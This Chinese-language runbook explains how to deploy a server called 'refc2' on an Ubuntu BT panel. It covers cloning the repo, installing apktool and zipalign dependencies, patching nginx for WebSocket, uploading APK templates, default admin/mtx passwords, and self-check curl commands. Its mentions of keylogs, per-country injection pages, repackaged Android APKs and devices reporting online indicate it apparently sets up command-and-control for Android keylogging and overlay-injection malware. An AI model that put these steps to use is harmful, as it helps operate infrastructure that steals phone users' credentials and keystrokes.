# 服务器部署（宝塔 + Python 项目）

> 目标：一台 Ubuntu 24.04 装上代码后，10 分钟内跑起面板 + 设备通道。
> 本文按 144.34.154.242（yk4.jk92.cc）的实际流程写，换机照做。

## 0. 前置

| 项 | 说明 |
|---|---|
| 系统 | Ubuntu 22.04 / 24.04 |
| 面板 | 宝塔（Python 项目管理器） |
| 代码目录 | `/www/wwwroot/yk4.jk92.cc` |
| 监听 | `127.0.0.1:8794`（只给本机 nginx 反代，不对外） |
| 域名 | `yk4.jk92.cc`（Cloudflare 代理） |

## 1. 拉代码

```bash
cd /www/wwwroot
git clone https://github.com/qqwq122825/yk4moying.git yk4.jk92.cc
cd yk4.jk92.cc
```

> 运行数据已进仓库：`state/refc2.db`（注入配置/设备/keylogs/users）与 `state/store.json`（账号、apkId）。
> 换机后**不用再手工重建配置**。

## 2. 依赖

```bash
apt-get install -y python3-venv python3-pip openjdk-17-jdk-headless zipalign
python3 -m venv venv
./venv/bin/pip install -r requirements.txt
```

- `python3-venv`：宝塔建虚拟环境必需；
- `openjdk-17`：**A 包构建必需**（source_builder 用 apktool 编译 A 包，缺 Java 会报
  `找不到可用的 java（JRE 17）`）。
- `zipalign`：**B 包必需**。没有它 relay_builder 只能产出未对齐的 apk，
  Android 11+ 会拒绝安装并报
  `-124: Targeting R+ requires the resources.arsc ... uncompressed and aligned on a 4-byte boundary`，
  现象就是 A 包停在 98%「安装已取消或失败」。装完可用
  `zipalign -c -v 4 build/<id>.apk | tail -1` 验证，应输出 `Verification successful`。

## 3. 宝塔建 Python 项目

```
Python项目 → Python环境管理 → 添加虚拟环境（基于 3.12，名字随意）
Python项目 → 添加项目
   项目名称   yk4_jk92_cc
   Python环境  选上一步建的虚拟环境（不能选"系统Python"，宝塔会拒绝）
   启动方式    命令行启动
   项目路径    /www/wwwroot/yk4.jk92.cc
   启动命令    python server/refc2.py --host 127.0.0.1 --port 8794
   启动用户    root
   依赖文件    /www/wwwroot/yk4.jk92.cc/requirements.txt
   端口        8794
```

## 4. ⚠️ 必须开启 WebSocket（最容易漏）

宝塔生成的 `python_yk4_jk92_cc.conf` 只有普通反代，**没有 Upgrade 头**，
设备 WebSocket 握手会得到 `400 Bad Request`，表现为：**接口都正常，但设备永远不在线**。

两条路选一：

**A. 图形化（推荐）**

```
Python项目 → 项目 → 设置 → 配置文件
  在 location / { 里的 proxy_pass http://127.0.0.1:8794; 下一行粘贴：
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 3600s;
  → 保存（宝塔自动 nginx -t + reload）
```

**B. 命令行（脚本化）**

```bash
python3 server/web-patch/../..//tools/enable_ws.py   # 见下方等价 sed
# 或直接用 python 改，幂等：
python3 - <<'PY'
p="/www/server/panel/vhost/nginx/python_yk4_jk92_cc.conf"
s=open(p).read()
if "proxy_set_header Upgrade" not in s:
    s=s.replace("        proxy_pass http://127.0.0.1:8794;",
        "        proxy_pass http://127.0.0.1:8794;\n"
        "        proxy_http_version 1.1;\n"
        "        proxy_set_header Upgrade $http_upgrade;\n"
        '        proxy_set_header Connection "upgrade";\n'
        "        proxy_read_timeout 3600s;",1)
    open(p,"w").write(s)
PY
nginx -t && nginx -s reload
```

**注意**：之后再点宝塔「外网映射」保存会重新生成配置，把这 4 行冲掉 —— 改完端口记得回来补。

验证（期望 `101 Switching Protocols`）：

```bash
curl -s -i --http1.1 -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
  "https://yk4.jk92.cc/io/?EIO=3&transport=websocket" | head -3
```

## 5. 模板 APK（不进 git）

```bash
scp moying-3.2-v605.apk root@<新机>:/www/wwwroot/yk4.jk92.cc/materials/templates/v3.2.apk
scp moying-3.1-v531.apk root@<新机>:/www/wwwroot/yk4.jk92.cc/materials/templates/v3.1.apk
cp materials/templates/v3.2.apk build/cloudfinder.apk
```

`materials/templates/templates.json` 已在仓库里（含 apk-3.2/apk-3.1 条目与默认首页）。

## 6. 启动与重启

```bash
# 手动（宝塔没接管时）
bash server/restart.sh 8794

# 宝塔接管后：面板点「启动/重启」
```

`restart.sh` 会：等端口释放 → 停旧进程 → 起新进程 → 轮询确认监听（最多 3 次）。
避免出现"旧进程占着 8794 → 新进程 EADDRINUSE → 站点 502"。

## 7. 账号

| 账号 | 密码 | 说明 |
|---|---|---|
| admin | mtx123 | 内置运营账号，密码来自环境变量 `REFC2_PASS`（默认 mtx123） |
| mtx | mtx123 | 超级管理员，apkId=2 |

**APK ID 规则**：每个账号唯一，admin=1、mtx=2，新建用户自动分配下一个可用号。
面板构建留空「APK ID」即归属当前登录账号。

## 8. 上线自检清单

```bash
curl -s -o /dev/null -w "panel:%{http_code}\n" https://yk4.jk92.cc/panel/
curl -s -X POST https://yk4.jk92.cc/api/login \
  -H 'Content-Type: application/json' -d '{"username":"admin","password":"mtx123"}' | head -c 120
curl -s "https://yk4.jk92.cc/api/device-inject-settings?country=peru" | head -c 120
curl -s -i --http1.1 -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
  "https://yk4.jk92.cc/io/?EIO=3&transport=websocket" | head -1
```

四项分别是：面板 200 / 登录 ok / 注入配置有数据 / WebSocket 101。
最后在面板「设备」里确认机器显示**在线**。

## 9. 常见故障对照

| 现象 | 原因 | 处理 |
|---|---|---|
| 站点 502 | refc2 没起 / 端口冲突 | `bash server/restart.sh 8794`，看 `logs/refc2.out` |
| 接口 200 但设备不在线 | nginx 缺 WebSocket 头 | 见第 4 步，握手应为 101 |
| 面板空白 / 下拉只有 v2.1、v2.2 | `templates.json` 缺失或 APK 没上传 | 见第 5 步 |
| A 包构建失败"找不到 java" | 没装 JDK 17 | `apt install openjdk-17-jdk-headless` |
| 注入页是旧内容 | 仓库里是旧版页面 | 用最新源文件覆盖 `materials/inject/` 并提交 |
| 设备 apkId 显示 10020 而不是 1 | 装的是本地调试包（模板默认值） | 用面板构建的包安装 |
